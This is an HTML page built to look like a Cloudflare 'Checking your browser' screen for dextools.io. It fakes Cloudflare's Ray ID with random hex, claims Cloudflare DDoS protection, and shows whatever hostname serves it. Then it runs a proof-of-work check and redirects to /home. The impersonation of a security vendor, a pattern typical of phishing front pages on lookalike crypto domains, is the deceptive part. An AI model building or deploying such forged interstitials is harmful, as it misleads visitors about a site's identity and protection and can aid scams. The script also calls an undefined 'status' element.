
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

 <title>Just a moment...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #222;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    text-align: center;
  }
  .container { max-width: 560px; padding: 40px 20px; }

  /* bouncing dots */
  .dots { margin-bottom: 28px; }
  .dot {
    display: inline-block;
    width: 16px; height: 16px;
    border-radius: 50%;
    margin: 0 5px;
    animation: bounce 1.1s infinite ease-in-out;
  }
  .dot:nth-child(1) { background: #f48120; animation-delay: 0s; }
  .dot:nth-child(2) { background: #fa9e40; animation-delay: 0.15s; }
  .dot:nth-child(3) { background: #fcc48d; animation-delay: 0.3s; }
  @keyframes bounce {
    0%, 80%, 100% { transform: translateY(0) scale(0.9); opacity: 0.75; }
    40%           { transform: translateY(-14px) scale(1); opacity: 1; }
  }

  h1 { font-size: 26px; font-weight: 700; margin-bottom: 14px; color: #1a1a1a; }
  p  { font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 8px; }
  .footer { margin-top: 34px; font-size: 13px; color: #555; }
  .footer a { color: #0051c3; text-decoration: none; }
  .footer a:hover { text-decoration: underline; }
  .ray { margin-top: 6px; color: #666; }
</style>
<base target="_blank">
</head>
<body>
  <div class="container">
    <div class="dots">
      <span class="dot"></span><span class="dot"></span><span class="dot"></span>
    </div>
    <h1>Checking your browser before accessing dextools.io.</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <p>Please allow up to 5 seconds&hellip;</p>
    <div class="footer">
      <div>DDoS protection by <a href="#">Cloudflare</a></div>
      <div class="ray">Ray ID: <span id="ray-id"></span></div>
    </div>
  </div>

<script>
(function () {
  var STORAGE_KEY = 'cf_ray_id';
  var rayId = null;

  try {
    // Reuse the Ray ID if one was already generated this session
    rayId = sessionStorage.getItem(STORAGE_KEY);
    if (!rayId) {
      // Generate a 16-char hex ID, mimicking Cloudflare's Ray ID format
      var bytes = new Uint8Array(8);
      crypto.getRandomValues(bytes);
      rayId = Array.from(bytes, function (b) {
        return b.toString(16).padStart(2, '0');
      }).join('');
      sessionStorage.setItem(STORAGE_KEY, rayId);
    }
  } catch (e) {
    // sessionStorage unavailable (private mode, blocked cookies, etc.) — fall back to per-load ID
    rayId = Math.random().toString(16).slice(2, 18).padEnd(16, '0');
  }

  document.getElementById('ray-id').textContent = rayId;
})();

if (location.hostname) {
    document.querySelector('h1').textContent =
      'Checking your browser before accessing ' + location.hostname + '.';
  }
</script>

<script src="https://cdn.jsdelivr.net/npm/@cap.js/widget"></script>
  <script type="module">
   

    /*
     * IMPORTANT:
     *
     * Replace this with your actual Cap API endpoint.
     *
     * Example:
     * https://cap.example.com/YOUR_SITE_KEY/
     *
     * If your Cap server is actually mounted behind your own
     * application at /api/, you can use:
     *
     * apiEndpoint: "/api/"
     */
    const CAP_API_ENDPOINT = "/";
    const POST_VERIFICATION_DELAY_MS = 20000;

    //const status = document.getElementById("status");

    async function verifyBrowser() {
      try {

        /*
         * Programmatic mode.
         *
         * Cap creates the widget internally and performs
         * the proof-of-work without displaying a CAPTCHA.
         */
        const cap = new Cap({
          apiEndpoint: CAP_API_ENDPOINT
        });

        const result = await cap.solve();

        if (!result || !result.token) {
          throw new Error("Cap did not return a token");
        }

        /*
         * Send the token to your Node.js server.
         */
        const response = await fetch("/verify", {
          method: "POST",
          credentials: "same-origin",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            token: result.token
          })
        });

        const data = await response.json();

        if (!response.ok || !data.verified) {
          throw new Error(
            data.error || "Browser verification failed"
          );
        }

        await new Promise(resolve => setTimeout(resolve, POST_VERIFICATION_DELAY_MS));
        window.location.replace("/home");

      } catch (error) {
        console.error("Cap verification error:", error);

        status.textContent =
          "Verification failed. Please refresh the page.";

        /*
         * Don't automatically loop forever if Cap fails.
         */
      }
    }

    verifyBrowser();
  </script>

</body>
</html>
